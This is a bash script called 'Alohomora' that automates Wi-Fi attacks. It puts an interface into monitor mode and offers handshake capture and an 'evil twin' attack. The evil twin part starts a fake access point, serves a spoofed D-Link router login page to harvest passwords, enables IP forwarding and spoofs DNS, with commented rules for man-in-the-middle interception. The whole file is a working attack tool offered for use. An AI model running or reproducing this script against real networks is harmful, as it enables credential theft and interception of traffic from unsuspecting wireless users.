#!/bin/bash
toilet -t -f mono12 --filter border:metal ":Alohomora:"
printf "                              || this script belongs to the half blood prince ||\n\n\n"


#-------------------------------------------------------------------------------------------------------------
# function for deciding the type of FAKE AP   ------------------------------------------------------------------
#-------------------------------------------------------------------------------------------------------------
function evil_twin_attack()
{
printf "\n[-] select the brand of FAKE AP:\n"
printf "\n[1] DIGISOL\n[2] TPLINK\n[3] D-LINK\n\n[-] Enter the number corresponding to the AP\n[->] "
read APName

APFlag=777
while true
do
case $APName in

  1)
    APFlag=1
    printf "\n[-] selected AP is: DIGISOL \n"
    ;;

  2)
    APFlag=2
    printf "\n[-] selected AP is: TPLINK \n"
    ;;

  3)
    APFlag=3
    printf "\n[-] selected AP is: D-LINK \n"
    rm /var/www/html/index.*
    cp APLoginPage/DlinkAP /var/www/html/index.php
    ;;

  *)
    printf "\n[ERROR] wrong input, select again\n[->] "
    read APName
    ;;
esac
if [[ $APFlag != 777 ]]
then
	break
fi
done

# running hostapd
printf "[-] creating fake AP. . .\n"
#xterm -geometry 93x31+100+35  -hold -e "hostapd hostapd.conf" &
xterm -geometry 93x31+100+35  -hold -e "hostapd conf_files/hostapd.conf" &
#hostapd hostapd.conf &
sleep 17
# assigning ip on the wlan interface
printf "[-] assigning ip on $interface. . . \n"
ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0

# adding the route for the network configured for dhcp
printf "[-] adding route. . .\n"
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

# configuring DHCP
printf "[-] starting DHCP server. . .\n"
#xterm -geometry 93x31+100+550  -hold -e "dnsmasq -C dnsmasq.conf -d" &
xterm -geometry 93x31+100+550  -hold -e "dnsmasq -C conf_files/dnsmasq.conf -d" &
#dnsmasq -C dnsmasq.conf -d &
sleep 7

# configuring the ip tables
printf "[-] configuring iptables. . .\n"
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT

#uncomment for mitm
#iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
#iptables --append FORWARD --in-interface wlan0mon -j ACCEPT

printf "[-] enabling ip forwarding. . .\n"
echo 1 > /proc/sys/net/ipv4/ip_forward


printf "[-] spoofing dns. . .\n"
dnsspoof -i wlan0mon 
#printf "[-] starting apache2 server. . .\n"
}


#-------------------------------------------------------------------------------------------------------------
# function for deciding the type of attack
#-------------------------------------------------------------------------------------------------------------
function select_attack()
{
attack_flag=0
printf "\n[-] select the attack to be performed\n"
printf "\n[1] Capture Handshake\n[2] Evil Twin\n[3] EXIT (for exiting this session)\n[->] "
read attack_flag
while true
do
    if [[ $attack_flag == 1 ]]
    then
	    printf "\n[-] initiating attack for captureing handshake. . . \n"
	    ./python_scripts/p_sniffer.py
	    select_attack
    elif [[ $attack_flag == 2 ]]
    then
	    printf "\n[-] starting EVIL TWIN  attack. . .\n" 
	    evil_twin_attack
	    break
    elif [[ $attack_flag == 3 ]]
    then
	    exit
    else
	    printf "\n[!] Invalid option, enter your option again.\n[->] "
	    read attack_flag
    fi
done
}

#-----------------------------------------------------------------------------------------------------------------
# configureing the wi-fi interface:     -----------------------------------------------------------
#-----------------------------------------------------------------------------------------------------------------

# selecting the interface for cmd arg if provided
if [[ $# -gt 0 ]]
then
    interface=$1
else
    interface=wlx08ea35e0293a
fi
printf "[-] interface $interface is selected \n" 

# killing the network manager
printf "[-] killing network manager. . ."
service network-manager stop
airmon-ng check kill
sudo systemctl stop NetworkManager

# checking the interface status and putting into monitor mode
ifconfig $interface down > /dev/null 2>&1
interface_status_flag=$(echo $?)
if [[ $interface_status_flag == 0 ]]
then
    printf "[-] interface $interface found !\n"
    printf "[-] putting $interface in monitor mode. . .  \n"
    airmon-ng start $interface
else
    printf "[!!ERROR] no interface named: $interface was found!\n"
    printf "[!!ERROR] exiting. . .\n"
    exit
fi
count=0
interface=wlan0mon
ifconfig $interface up

while true
do
    flag=$(cat /sys/class/net/wlan0mon/operstate)
    if [[ $flag == "up" ]]
    then
	printf "[-] $interface is up \n"
	break
    elif [[ $flag == "down" ]]
    then
	printf "[-] $interface is down \n"
        printf "[-] trying to bring $interface up again. . .\n"
	ifconfig $interface up
	count=`expr $count + 1`
	sleep 5
    elif [[ $flag == "unknown" ]]
    then
	printf "[-] interface status unknown. . . \n"
	break
    fi
    if [[ $count == 5 ]]
    then
	count=777
	break
    fi
done

# if the status is down,
if [[ $count == 777 ]]
then
    printf "[-] $interface status still down, exiting program. . .\n"
    exit
fi

#-----------------------------------------------------------------------------------------------------------------
# MAIN:                                      -----------------------------------------------------------
#-----------------------------------------------------------------------------------------------------------------
select_attack
